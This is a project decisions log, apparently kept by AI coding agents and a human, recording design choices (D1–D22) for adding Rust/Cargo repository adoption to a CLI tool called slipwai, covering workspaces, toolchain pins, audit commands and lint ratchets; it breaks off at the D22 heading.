# Decisions — 001-rust-cargo-adopt

## D1 — Ground: the map rows this feature touches are still the survey's reading; proceed on them?
- **Stage:** ground · **Slice:** feature · **When:** 2026-09-28T20:51:00Z · **Iteration:** 1
- **Question:** Safety net (`tests-exist`), Structure (`named`), Path to production (`pipeline`) and Strategy (`recommended`) are `detected`, not a person's answer; the feature changes the survey under `src/slipwai/` and touches all four. Place them, or proceed?
- **Options:** ask a person and park · proceed on the detected values as stated assumptions, rows left as they are (stop table row 13, recommended)
- **Decision:** Proceed on the detected values as stated assumptions: the suite recorded for `slipwai` is the safety net (`make verify`), the one application is the `slipwai` tool at the root, and a change reaches users through the existing publish pipeline on a `v*` tag. No row is moved or marked `confirmed`.
- **Why:** A fact about the world is not a decision; the rows stay the tree's reading until the owner places them, and the work is additive inside the tool the map already names.
- **Decided by:** host (stage recommendation)
- **Confidence:** high · **Would reverse if:** the owner places a row differently with `/ground` — for example says the suite is not green on trunk
- **Written to:** specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D2 — Change strategy: which strategy do slices land under?
- **Stage:** ground · **Slice:** feature · **When:** 2026-09-28T20:52:00Z · **Iteration:** 1
- **Question:** The map recommends `leave-it` and no ADR records a decision; the word `Accepted` is a person's.
- **Options:** leave-it (recommended by the survey) · in-place · modular-monolith · strangler-fig · rewrite
- **Decision:** Proceed on `leave-it`, drafted as ADR 0002 at `Proposed`; slices land in the existing `slipwai` package.
- **Why:** The trigger is two additive capabilities inside the one tool; nothing in it asks for a new home.
- **Decided by:** host (stage recommendation)
- **Confidence:** high · **Would reverse if:** the owner rejects ADR 0002 or names a structural trigger
- **Written to:** delivery/docs/adr/0002-change-strategy-leave-it.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D3 — Principles: the constitution is still the template; ratify one drafted from the repo's own rules, or park?
- **Stage:** principles · **Slice:** feature · **When:** 2026-09-28T20:54:15Z · **Iteration:** 1
- **Question:** `.specify/memory/constitution.md` is still the template `./delivery/init` installed, and `specs/` already has a feature, so `check-constitution` fails and every later phase would plan against nothing (stop table row 2, `constitution: ratify`).
- **Options:** ratify a constitution drafted from the repo's own rules (recommended by the stop table) · park for a person
- **Decision:** Ratify version 1.0.0, drafted from AGENTS.md, docs/maintaining.md, the convergence map and D1/D2, and marked `ratified by cruise (skipper) — pending human review`. The domain invariant (Principle I) is that an answer a project already gave keeps its meaning, a released version is spent and migration is exact; Principle II says re-running a command is safe. Trunk-based integration is written in force, because the Integration row is `trunk` and `confirmed`. The seven principles whose axis is below its rung (one-path, build-once, fast-feedback, acceptance-driven, hexagonal, ubiquitous-language, strict-typing) are targets, each with its marker, what holds today and the next rung, and none is planned. Nothing the repo lacks is set: no review SLA, no deprecation window, no flag lifetime, no rollback or detection target. Dependency scanning is written as an obligation that starts once an audit command is recorded, not as one in force.
- **Why:** AGENTS.md says the factory is held to the standard it generates, so the floor is this repo's own declared rule and not an invention; what it adds is how the floor applies to a Python CLI with no service, no money and no personal data. Parking would leave feature 001 unplannable over a document whose content the repo already states in its own rules. Whoever runs `slipwai generate` or adopts a repository with it is protected by exactly the release and migration rules Principle I encodes.
- **Decided by:** drive-skipper (claude-opus-5-5[1m])
- **Confidence:** medium · **Would reverse if:** the person reviewing it rejects Principle I as this repository's domain invariant
- **Written to:** .specify/memory/constitution.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D4 — Split: which slice first, and in what order do the rest follow?
- **Stage:** split · **Slice:** feature · **When:** 2026-09-28T21:10:00Z · **Iteration:** 1
- **Question:** The specification's three stories are P1–P3; how are they cut into vertical slices, and which is the walking skeleton?
- **Options:** one slice per user story · five slices by rule and data variation, single crate first (recommended) · workspace first, since most real repositories are workspaces
- **Decision:** Five slices — `single-crate`, then `optional-tools`, `toolchain-pin` and `workspace` together, then `ci-toolchain` after `toolchain-pin` — as `story-split.md` records.
- **Why:** The specification ranks the single crate P1 as the whole value for the first user; each later slice is one variation a maintainer can see on its own, and three of them can run beside each other against the Cargo row slice 1 leaves.
- **Decided by:** host (stage recommendation)
- **Confidence:** medium · **Would reverse if:** the first user's repository is a workspace, which would pull `workspace` up to second
- **Written to:** specs/001-rust-cargo-adopt/story-split.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D5 — Programme: the thirteen quick wins the survey lists — are any of them a slice ahead of this feature?
- **Stage:** convergence programme (read at pin) · **Slice:** single-crate · **When:** 2026-09-28T21:40:00Z · **Iteration:** 2
- **Question:** `delivery/docs/change-strategy.md` opens its programme with four "connection string with a password" findings and nine "no lockfile" findings; a secret in the tree goes ahead of every product slice (stop table row 15).
- **Options:** open a quick-win slice per finding · record them as false positives read off the tree, no slice (recommended)
- **Decision:** No slice. The four "secrets" are documentation and test placeholders (`postgres://user:pass@host:port/db` in a Javadoc at `assets/backing-services/java/database_url.java:10`, `app:secret@localhost` in its unit test, `someone:a-token@git.example` in `tests/test_release.py:295` and `tests/test_upgrade.py:187`); the nine lockfile findings are templates under `assets/` that the factory copies into a generated project, where the project's own install writes the lockfile.
- **Why:** Each line was read, and none names a host anyone can reach; opening a rotation slice for a string that authenticates to nothing would spend the run on nothing a maintainer adopting a Cargo repository sees.
- **Decided by:** host (stage recommendation)
- **Confidence:** high · **Would reverse if:** any of those credentials is found to work against a real system, or the owner wants the survey itself to stop reporting factory templates (a factory change of its own)
- **Written to:** specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D6 — Pin: the application has no proven run path and no `smoke`; how does the slice get past the refusal?
- **Stage:** pin · **Slice:** single-crate · **When:** 2026-09-28T22:15:00Z · **Iteration:** 2
- **Question:** `delivery/survey/running.md` read *Not yet proven* for `.` and `project.json` had no `commands.smoke`, so Pin refuses every slice that changes code that was here until the run path is proven — and the generated `smoke` target lives in `delivery/Makefile`, a control file a run may not change.
- **Options:** park for a person to prove it · prove the run path in the tree and record `commands.smoke`, leaving the generated target for a person to regenerate (recommended by the bosun's standing moves)
- **Decision:** Proved and recorded: `./slipwai --version && ./slipwai adopt --next`, from the root, exits 0 and leaves `git status` unchanged (re-run by the host on 2026-09-28 after the bosun's session was cut off); written into `delivery/survey/running.md` and `project.json` `deployables.slipwai.commands.smoke`. `delivery/Makefile`'s `smoke` target was not regenerated and still says none is recorded.
- **Why:** The rule is that the application starts before its behaviour is pinned; that is a fact of the tree, provable here with the checkout's own launcher, and nobody has to supply anything for it. Regenerating the Makefile is a control-file change, which only a person makes.
- **Decided by:** drive-bosun
- **Confidence:** high · **Would reverse if:** a person regenerates the targets (`./slipwai adopt --refresh`) and `make -f delivery/Makefile smoke` fails, or wants a different smoke — a task in the next slice is to confirm `make -f delivery/Makefile smoke` runs the recorded command once regenerated
- **Written to:** delivery/survey/running.md, project.json, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D7 — Release constraint: how does single-crate reach users, and what gates it?
- **Stage:** release constraint · **Slice:** single-crate · **When:** 2026-09-28T22:30:00Z · **Iteration:** 2
- **Question:** `release: flagged` asks every slice to land dark behind a flag seeded off, and `delivery/docs/deployment.md` says no flag mechanism is installed here; how is this slice held?
- **Options:** releasable on merge · held behind the toggle this repository already has — the `.dev` pre-release that only `make release` turns into a release (recommended) · a coordinated deploy
- **Decision:** Held behind the pre-release. A merge to `main` publishes `1.4.0.dev<N>`, which installers pass over unless asked; only a person's `make release` makes it a release, and a person merges the PR. No flag file is opened.
- **Why:** That is the repository's own dark-launch: a maintainer who did not opt into snapshots never sees the change, and the adoption path it extends is labelled experimental. A code flag around one row of a recognition table would add a switch with nothing to switch between.
- **Decided by:** host (stage recommendation)
- **Confidence:** high · **Would reverse if:** the owner wants snapshots treated as released, so that a merge needs a flag of its own
- **Written to:** specs/001-rust-cargo-adopt/slices/single-crate/plan.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D8 — Implementation pre-flight: `make verify` is red in the runner's session for seven cruise tests; whose red is it?
- **Stage:** implementation · **Slice:** single-crate · **When:** 2026-09-28T23:40:00Z · **Iteration:** 2
- **Question:** The slice starts from a green `make verify`; inside this iteration it ends `FAILED (failures=6, errors=1)`, every one in `test_cruise_start`, `test_cruise_watch`, `test_cruise_where`, `test_cruise_index` and `test_benchmark_brackets` — tests that spawn `cruise.py` and read `CRUISE_RUNNER` / `CRUISE_ITERATION`, which the runner sets on this session.
- **Options:** park on the gate's own output · treat the tree as green where those five modules pass with the runner's two variables unset, and run every gate this iteration that way (recommended) · change the tests to clear the variables
- **Decision:** The tree is green: lint, typecheck and check-structure passed, and the five modules pass (16 tests, OK) under `env -u CRUISE_RUNNER -u CRUISE_ITERATION`. Every `make verify` in this run is invoked with those two variables unset. The tests are not changed in this slice.
- **Why:** The failures are this session's environment reaching into a subprocess, not anything in the tree a maintainer would get; the gate itself is untouched, and the same command a person runs is what passes. Making those tests isolate their environment is a change to the method's own test tree, outside a Cargo slice.
- **Decided by:** host (stage recommendation)
- **Confidence:** high · **Would reverse if:** any of the seven fails with the variables unset, or a person wants the suite to clear them itself — a task for a later slice
- **Written to:** specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D9 — Converge: should the survey read database drivers out of `Cargo.toml` in this feature?
- **Stage:** convergence · **Slice:** single-crate · **When:** 2026-09-29T01:35:00Z · **Iteration:** 2
- **Question:** `survey.DEPENDENCY_MANIFESTS` does not list `Cargo.toml`, so a driver a crate declares (`sqlx`, `diesel`, `tokio-postgres`) is not reported on the database axis; a task here, or issue #11?
- **Options:** a task in this slice · left to issue #11 with the other Rust axis answers (the specification's out-of-scope line)
- **Decision:** Left to issue #11. The survey still proposes the candidate and its commands, which is what this feature promises; which database a crate talks to is an axis answer, and the Assumptions and the slice's gaps review put every Rust axis answer in #11.
- **Why:** The specification answers it outright (Assumptions: axis answers for Rust are issue #11), which is the recommendation taken. A maintainer adopting a crate gets its build and gate from this feature; the database row reads `none` for them exactly as it does for any ecosystem whose drivers the survey does not read yet, and they can place it with `/ground`.
- **Decided by:** host (stage recommendation)
- **Confidence:** high · **Would reverse if:** the owner wants the database axis answered for Rust before #11
- **Written to:** specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D10 — Gaps after converge: the proposed lint lets new clippy findings through the ratchet; what does lint propose?
- **Stage:** gaps (after converge) · **Slice:** single-crate · **When:** 2026-09-29T01:55:00Z · **Iteration:** 2
- **Question:** The adopted gate's ratchet keys a finding by a line naming a file at a position; clippy's default output puts the position on its own ` --> file:line:col` line, so every finding in a file is one key and a baselined crate passes with any number of new warnings (HIGH). SG3 and US1 scenario 2 fix the command's text.
- **Options:** keep SG3 as written and record the hole · add `--message-format=short` to the clippy half, one line per finding (recommended by the gaps pass) · split lint and format, or run both with `;` keeping the worst exit
- **Decision:** Lint is `cargo clippy --all-targets --message-format=short -- -D warnings && cargo fmt --check`, prefixed once as SG3 says. The `&&` stays: it is the order-and-chain the factory's own generated Rust gate uses (`src/slipwai/project/languages/rust.py:120`), and a red clippy that hides fmt drift until it is fixed is the same trade every combined lint makes. A clippy that is absent (exit 101, not 127) and the Catch-up wording are Phase 4 tasks.
- **Why:** A maintainer who adopts a crate with existing warnings is promised that the gate only lets the count go down; with the default format that promise is false for every file that already has one warning. The short format keeps every other property of the command.
- **Decided by:** host (stage recommendation)
- **Confidence:** medium · **Would reverse if:** the owner wants lint and format as separate proposals, which would change the eight-target shape the survey records
- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/slices/single-crate/plan.md, specs/001-rust-cargo-adopt/slices/single-crate/research.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D11 — Gaps: should a Cargo workspace's proposed check, clippy and test carry `--all-features` on top of `--workspace`?
- **Stage:** gaps · **Slice:** workspace · **When:** 2026-09-30T18:13:00Z · **Iteration:** 3
- **Question:** When the survey proposes commands for a Cargo workspace root (US3, FR-006, SC-002), should `cargo check`, `cargo clippy` and `cargo test` also carry `--all-features`, on top of the `--workspace` that US3 scenario 2 names?
- **Options:** no feature flag, so Cargo's default features, as a single crate gets today (recommended by the gaps pass) · `--all-features` on check, clippy and test · `--all-features` on check and clippy only, with default features for test
- **Decision:** No feature flag. A workspace root is proposed exactly what a single crate is proposed, plus `--workspace` where Cargo would otherwise build only the root package: `cargo check --workspace --all-targets`, `cargo clippy --workspace --all-targets --message-format=short -- -D warnings && cargo fmt --check` (D10's lint, unchanged otherwise), and `cargo test --workspace`. The rule is the same for a single crate and a workspace, so a crate's commands keep their shape when it gains a member.
- **Why:** Commands are proposals the maintainer confirms or overrides, so the proposal has to be the one that runs on any machine on day one. `--all-features` fails that for the first repository this slice serves: Cairn's `app` feature pulls in tauri, which needs the system WebKit libraries, so its gate would fail on every runner without them; it also breaks any crate whose features are mutually exclusive. Option 3 has the same problem, since check and clippy build the feature-gated code as test does. Default features are what Cargo builds and what the factory's own generated Rust gate uses (`src/slipwai/project/native_commands.py`); a maintainer who wants the feature matrix adds `--all-features` when confirming — one override.
- **Decided by:** drive-skipper (claude-opus-5-5[1m])
- **Confidence:** high · **Would reverse if:** the survey learned to prove that enabling every feature needs nothing beyond Cargo — no optional dependency needing system libraries, no mutually exclusive features — which no text match on `Cargo.toml` can prove
- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D12 — Gaps: below a Cargo workspace root, is a `Cargo.toml` that declares its own workspace owned by the outer root, or a candidate of its own?
- **Stage:** gaps · **Slice:** workspace · **When:** 2026-09-30T18:14:41Z · **Iteration:** 3
- **Question:** The spec's edge case says a workspace member that is itself a nested workspace root is not proposed separately. Cargo 1.98.0 refuses that configuration (`error: multiple workspace roots found in the same workspace`). The case the survey will actually meet is a separate workspace below the root — cargo-fuzz's `fuzz/` with `[workspace] members = ["."]` — with its own `Cargo.lock`, which the outer root's `--workspace` commands do not build (`research.md`).
- **Options:** (1) the outer root owns every `Cargo.toml` below it, as the edge case is written · (2) a `Cargo.toml` that declares a workspace always starts a candidate of its own and owns what is below it, plain members stay owned, and the edge case is reworded to what Cargo does (recommended by the stage) · (3) park for a person because it amends a written edge case
- **Decision:** Option 2. In the Cargo row only, a directory whose `Cargo.toml` has a `[workspace]` or `[workspace.<x>]` table header is never owned by an outer Cargo owner: it is proposed as its own candidate and owns what is below it. A `Cargo.toml` with no such header under a workspace root stays owned and is not proposed (FR-006, SC-002). No other ecosystem's ownership changes — a nested `package.json` with `"workspaces"` under an npm workspace root stays owned (SC-004). Detection stays a header text match and reads neither `members` nor `exclude`. The spec's edge-case line is reworded accordingly.
- **Why:** The maintainer is promised that every buildable directory ends up covered by a recorded command, or visible so they can decline it. Under option 1 a cargo-fuzz `fuzz/` workspace, or any excluded workspace, would vanish: the outer root's commands never build it, `resurvey` never reports a directory an owner hides, and the maintainer could not add it back. Under option 2 it is proposed in its own directory with its own commands, as SG5 already does for a `fuzz/` under a single crate. The case the old line described builds nowhere under either option; option 2 at most shows one extra candidate to decline, pointing at the real configuration error.
- **Decided by:** drive-skipper (claude-opus-5-5[1m])
- **Confidence:** high · **Would reverse if:** the survey is later given `members`/`exclude` parsing, and the owner wants a nested workspace root listed in the outer `members` (the refused case) reported as a configuration fault instead of proposed
- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D13 — Gaps: a workspace member has no `Cargo.lock` beside it; is that a "no lockfile" quick win?
- **Stage:** gaps · **Slice:** workspace · **When:** 2026-09-30T18:25:00Z · **Iteration:** 3
- **Question:** `quick_wins.missing_lockfiles` reports every `Cargo.toml` with no `Cargo.lock` in its own directory. Cargo writes one lockfile, at the workspace root (`research.md`), so every member of a workspace — Cairn's `src-tauri/helper` — would be reported as a big issue at the top of the programme, though nothing is wrong.
- **Options:** leave it, as npm workspace packages are reported today · for Cargo only, a manifest that declares no workspace of its own counts the `Cargo.lock` beside the nearest workspace root above it (recommended) · count a `Cargo.lock` anywhere above
- **Decision:** For `Cargo.toml` only: a manifest that declares a workspace, or has no workspace root above it, needs its lock beside it, as today; a manifest below a workspace root that declares none is a member and needs the lock beside the nearest such root. `package.json`, `Gemfile` and `composer.json` are unchanged (SC-004). A separate workspace (D12) with no lockfile of its own is still reported.
- **Why:** The same fact FR-006 turns on — a member is not a build of its own — decides where its lockfile lives; a quick win the maintainer cannot act on sits ahead of every real one in the programme and teaches them to ignore the list. "Anywhere above" would hide a separate workspace's missing lock.
- **Decided by:** host (stage recommendation)
- **Confidence:** high · **Would reverse if:** the owner wants npm workspaces made consistent in the same change, which would change an existing ecosystem's answer and needs a slice of its own
- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D14 — Convergence: a Cargo workspace root shares its directory with a manifest tried earlier; what does the survey propose?
- **Stage:** convergence · **Slice:** workspace · **When:** 2026-09-30T19:22:43Z · **Iteration:** 3
- **Question:** `survey.buildable` reports a directory once, by the first row of `ECOSYSTEMS` that detects it, and Cargo is tried last; only a detected Cargo candidate becomes an owner. So a root `package.json` (napi-rs) or `pyproject.toml` (maturin) beside a root `Cargo.toml` with `[workspace] members = ["crates/*"]` surveys as `.` plus one Cargo candidate per member, each without `--workspace` — N+1 candidates against FR-006/SC-002, while `missing_lockfiles` (D13) treats those members as members (T010 HIGH).
- **Options:** (a) the Cargo workspace root in that directory still owns the crates below it; no member is proposed, the directory stays one candidate as the ecosystem tried first, and the Rust is gated when the maintainer overrides the root's language and commands (recommended by the host) · (b) also propose a Cargo candidate at the same path, changing the one-candidate-per-directory shape · (c) leave it and name it under *Not working yet*
- **Decision:** (a). A directory whose `Cargo.toml` declares a workspace (WG1) is recorded as a Cargo owner whichever ecosystem reports it, so a `Cargo.toml` below it that declares no workspace is a member and is not proposed; the owner hides only a directory whose first detection is Cargo (a member directory that also holds a `package.json` is still Node), and a workspace below it is still its own candidate (D12). One membership predicate decides both `buildable`'s ownership and `missing_lockfiles`. Nothing new on the survey page or the adopt report; the fragment and `docs/adopting.md` state the rule, with the override (`--language <app>=rust` and `--command`) named.
- **Why:** FR-006 is a MUST, so (c) is not open, and per-member commands build one member at a time against the root's lock — the wrong gate. (b) changes the shape every consumer keys a deployable by (`project.json`, the Makefile, the ratchet, `resurvey`) and is a feature of its own. (a) costs the maintainer exactly the override the Assumptions promise for a mixed directory, and in both shapes the Node or Python tool usually drives the Rust compile (`napi build`, `maturin`). Cairn keeps its manifests in separate directories and is unaffected.
- **Decided by:** drive-skipper (claude-opus-5-5[1m])
- **Confidence:** high · **Would reverse if:** the owner wants the Rust in a mixed directory proposed with Cargo's own commands without an override — option (b), taken as its own feature
- **Written to:** specs/001-rust-cargo-adopt/slices/workspace/tasks.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D15 — Adversary: a Cargo workspace whose directory another ecosystem's owner hides; what is proposed?
- **Stage:** adversary · **Slice:** workspace · **When:** 2026-09-30T20:05:00Z · **Iteration:** 3
- **Question:** A directory holding a `package.json` and a `Cargo.toml` that declares a workspace, inside an npm workspace (a napi-rs package in a monorepo), is owned by the npm root and never proposed; since D14 its Cargo members are owned by it, so the Rust vanishes from the survey altogether (adversary W1, a regression against `0e3bab3`).
- **Options:** propose the Cargo workspace at that directory as a candidate of its own when its first detection is owned (recommended) · go back to proposing each member · name it under *Not working yet*
- **Decision:** Where a directory's first detection is owned by an outer build of its ecosystem and the directory's `Cargo.toml` declares a workspace, the directory is proposed as the Cargo candidate, with the workspace commands, and owns its members. Nothing else changes: a directory whose first detection is not owned stays that ecosystem (D14), an owned directory without a Cargo workspace stays hidden as today, and no other pair of ecosystems gains a fallback (SC-004).
- **Why:** The promise every Cargo decision in this slice rests on (D12, D14) is that each build is covered by a proposal or visible to decline; the npm root's commands do not build Rust, so the workspace is a build nobody else covers. It is the narrowest change that keeps FR-006 (no member proposed) and SC-004.
- **Decided by:** host (stage recommendation)
- **Confidence:** medium · **Would reverse if:** the owner wants the fallback for every ecosystem pair, not only a Cargo workspace — a change to existing answers, a slice of its own
- **Written to:** specs/001-rust-cargo-adopt/slices/workspace/tasks.md, specs/001-rust-cargo-adopt/adversary-log.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D16 — Kick-off: what is this run for?
- **Stage:** kick-off · **Slice:** none · **When:** 2026-10-01T19:37:07Z · **Iteration:** 2
- **Question:** The run was started as `/cruise Rust issues`; which work does that scope?
- **Options:** the fork's two open Rust issues, #10 first (the slices left in this feature: `optional-tools`, `toolchain-pin`, `ci-toolchain`), then #11 (Rust answers every axis) as a specification of its own (recommended) · #10 only · #11 only
- **Decision:** Both open Rust issues, in order: finish #10 through this feature's split, then bring #11 in as feature `002` through the ladder's own stages, the issue as its brief. #15 and #22 are not Rust issues and are not taken; #22 is being fixed beside this run (`slice-scope-root-application`).
- **Why:** The kick-off, `/cruise Rust issues`, read by the host: "Rust issues" names the issues, plural; #10 is half-built and its remaining slices are ready, and #11's own text orders its work.
- **Decided by:** human
- **Confidence:** medium · **Would reverse if:** the person meant only one of the two issues, or wants #15 taken with them
- **Written to:** specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D17 — Slice branches: `slice/<id>` while #22 refuses every file of a root application?
- **Stage:** ready set · **Slice:** optional-tools, toolchain-pin · **When:** 2026-10-01T19:37:07Z · **Iteration:** 2
- **Question:** `slipwai` is recorded at path `.`, and `check-slice-scope` on a `slice/<id>` branch refuses every file under a root application (#22), so a slice that changes `src/slipwai/` cannot pass `make verify` there.
- **Options:** claim with `slice/<id>` and do the work on a feature-named branch, as #18 and #20 did, holding the shared-surface rule by brief (recommended) · park until #22 lands · edit the gate (not available: the catastrophic list)
- **Decision:** Claim with a `slice/<id>` ref; work and push on `001-rust-cargo-adopt-<id>`; each delegate's brief carries the shared-surface rule.
- **Why:** The precedent of this feature's two merged slices (PRs #18 and #20); the gate is fixed in the factory, not here, and the fix is in flight.
- **Decided by:** host (stage recommendation)
- **Confidence:** high · **Would reverse if:** #22's fix lands on `main` before these slices push — then they move to `slice/<id>`
- **Written to:** specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D18 — Gaps: a Cargo candidate with a `deny.toml`; what audit command does the survey propose?
- **Stage:** slice gaps · **Slice:** optional-tools · **When:** 2026-10-01T20:00:00Z · **Iteration:** 2
- **Question:** When a Cargo candidate carries a `deny.toml` beside its manifest (US1 scenario 3, FR-003), what audit is proposed? Plain `cargo deny check` runs all four checks (advisories, bans, licenses, sources), a section the file leaves out running on its defaults; with cargo-deny 0.20.2 a `deny.toml` holding only `[advisories]` exited 4, `licenses FAILED`, on an unlicensed crate.
- **Options:** (a) `cargo deny check`, as the spec text says (recommended by the gaps pass) · (b) `cargo deny check advisories`, as the factory's generated Rust projects run · (c) `cargo deny --locked check advisories`
- **Decision:** (b). Audit is `cargo deny check advisories`, in the candidate's own directory (FR-004), with `--workspace` at a workspace root (D20); no `deny.toml`, a written no-answer (FR-003). US1 scenario 3's "Then" reads `cargo deny check advisories`; FR-003 is unchanged.
- **Why:** The constitution's audit is a dependency vulnerability scan — the Platform row's `audited` rung means a known-exploitable critical finding blocks release (§IX) — and every other ecosystem's proposed audit is exactly that (`npm audit --audit-level=critical`, `pip-audit`, `composer audit`, … in `src/slipwai/ecosystems/rows.py`); licence, ban and source rules are policy. (a) proposes a command red on day one for sections the maintainer never configured, and lifts their rung to `audited` on a target red for licence reasons, which `verify` never runs to show. (c) puts `--locked` on one proposal when only install carries it (D10, D11). A maintainer who wants the whole policy widens it with one override.
- **Decided by:** drive-skipper (claude-opus-5-5[1m])
- **Confidence:** high · **Would reverse if:** the owner wants an adopted repository's audit to apply its whole `deny.toml` policy rather than vulnerabilities alone — which would redefine what `audited` claims for every ecosystem
- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D19 — Gaps: where does the survey look for a Cargo candidate's toolchain pin, and what does the record carry for `ci-toolchain`?
- **Stage:** slice gaps · **Slice:** toolchain-pin · **When:** 2026-10-01T19:44:15Z · **Iteration:** 2
- **Question:** For a Cargo candidate (FR-005, US2 scenarios 1–3), is `rust-toolchain` / `rust-toolchain.toml` read only in the candidate's own directory, as the sibling rows read their pins, or walking up toward the repository root as rustup does? And what must the record carry for `ci-toolchain` (FR-007), where `actions-rust-lang/setup-rust-toolchain` reads a toolchain file only at the repository root and ignores it whenever a `toolchain` input is given?
- **Options:** (a) the candidate's own directory only · (b) walk up from the candidate's directory to the repository root and stop there, nearest file wins (recommended by the gaps pass); for the hand-over: the version string only · the version plus whether the pin was found at the root
- **Decision:** (b), version string only. The survey looks in the candidate's directory, then each parent up to and including the repository root, never above; the first directory holding a toolchain file decides and the search stops there (D21 says which file wins within it and what is read). A file that names no channel records an empty version and does not search further; no file anywhere on the way up, an empty version (US2 scenario 3). The record keeps its shape, `{"kind": "rust", "version": "<pin or empty>"}`: no new field, no new published contract. Other ecosystems keep reading their own directory (SC-004). `ci-toolchain` gets the recorded version as its one input — a non-empty version can go to the action's `toolchain` input wherever the file sits — and its map owns the step's exact text, including the components the gate needs once the file is ignored.
- **Why:** The gate runs `cd <dir> && cargo …`, and from there rustup walks up and builds with the nearest pin; recording anything else names a toolchain the build does not use. For the Tauri shape (WG5) the pin commonly sits at the root above `src-tauri`, and (a) would record no pin for a repository that has one — CI would install a default and fail on the first push, the failure US2 exists to prevent. Stopping at the root keeps the answer inside the checked-out tree, so `adopt --refresh` stays a no-op (Principle II). A "found at root" flag would be a new field and go stale the moment the maintainer overrides the version.
- **Decided by:** drive-skipper (claude-opus-5-5[1m])
- **Confidence:** high · **Would reverse if:** `ci-toolchain` finds no setup step can be written correctly from the version alone (components or targets only the file lists, dropped by the action and not installed by rustup on use) — then where the pin was found is a needed fact, and adding it is an ADR first
- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D20 — Gaps: which configuration files make audit and mutation appear, and how do they cover a workspace?
- **Stage:** slice gaps · **Slice:** optional-tools · **When:** 2026-10-01T19:46:00Z · **Iteration:** 2
- **Question:** cargo-deny reads `deny.toml`, `.deny.toml` or `.cargo/deny.toml`, from the directory it runs in and each one above; cargo-mutants reads `.cargo/mutants.toml` at the workspace root only, never a member's and never a bare `mutants.toml` (cargo-mutants 27.1.0, probed); at a root that is both `[workspace]` and `[package]`, `cargo mutants` mutates only the root package unless given `--workspace`. Which files count, and what do the commands carry?
- **Options:** FR-003's `deny.toml` beside the manifest only · any of cargo-deny's three names in the candidate's directory, mutation from `.cargo/mutants.toml` there, `--workspace` on both at a workspace root, no `--in-diff`, no missing-tool guard (recommended by the gaps pass)
- **Decision:** The recommended set. Audit appears where the candidate's directory holds `deny.toml`, `.deny.toml` or `.cargo/deny.toml`; mutation where it holds `.cargo/mutants.toml`, the candidate's directory being its workspace root when it is one. A file only in a member, or only above the candidate, proposes nothing. Where the candidate declares a workspace (WG1) the commands are `cargo deny --workspace check advisories` and `cargo mutants --workspace`; otherwise `cargo deny check advisories` and `cargo mutants`; in a subdirectory, prefixed once (SG3). No `--in-diff` or Make variable, and no `command -v` guard, as the sibling rows record theirs. The existing fragment is amended rather than a new one written, and both fixtures stay unconfigured.
- **Why:** The proposal has to be what the tool itself reads, or the maintainer is offered audit or mutation on a file the tool ignores and denied it on one the tool reads; `--workspace` is WG2's rule for the same reason. A missing tool fails `make audit` loudly (cargo exit 101) and nothing is baselined, since neither target is ratcheted. No release carried the old fragment's wording (Principle I).
- **Decided by:** host (stage recommendation)
- **Confidence:** high · **Would reverse if:** the owner wants a `deny.toml` at the repository root to count for a crate below it, which cargo-deny honours and this reading does not
- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D21 — Gaps: which file wins, what is recorded for a channel that is not a version, and is `rust-version` a pin?
- **Stage:** slice gaps · **Slice:** toolchain-pin · **When:** 2026-10-01T19:46:30Z · **Iteration:** 2
- **Question:** rustup uses `rust-toolchain` over `rust-toolchain.toml` when both are in one directory ("for backwards compatibility", https://rust-lang.github.io/rustup/overrides.html); a channel may be `stable`, `nightly-2025-01-01` or `1.85-beta`, which `first_line` (strips a leading `v`) and `platform.numbers` would misread; `channel` and `path` are mutually exclusive; and `Cargo.toml`'s `rust-version` is an MSRV, though Node and Python fall back to their floors.
- **Options:** FR-005's word order, dotted versions only, `rust-version` as a fallback · `rust-toolchain` first, the channel recorded as written, `path` never recorded, `rust-version` not read (recommended by the gaps pass)
- **Decision:** The recommended set. Within one directory `rust-toolchain` wins; its content is TOML where it starts with `[`, otherwise its first non-blank line, stripped, no leading `v` removed. `rust-toolchain.toml`'s `toolchain.channel` is read with `tomllib`. The version is the channel exactly as written; a table with no `channel`, a non-string one, a `path` toolchain, invalid TOML, an empty, oversize or non-regular file all record an empty version and never an error. `rust-version` is not read. The candidate's evidence stays `Cargo.toml`. Rust has no row in `support.json`, so the Platform row says nothing about a pin — out of scope here.
- **Why:** The recorded value is what rustup and the setup action will consume, so it is rustup's reading or nothing; installing the MSRV would test a compiler the developers do not use.
- **Decided by:** host (stage recommendation)
- **Confidence:** high · **Would reverse if:** rustup is shown not to accept TOML in a `rust-toolchain` file (assumed), or the owner wants the MSRV recorded where no pin exists
- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md
- **Status:** standing

## D22 — Plan: a `rust-toolchain` of more than one line that does not start with `[` — first line, or TOML?
- **Stage:** plan · **Slice:** toolchain-pin · **When:** 2026-10-01T20:05:00Z · **Iteration:** 2
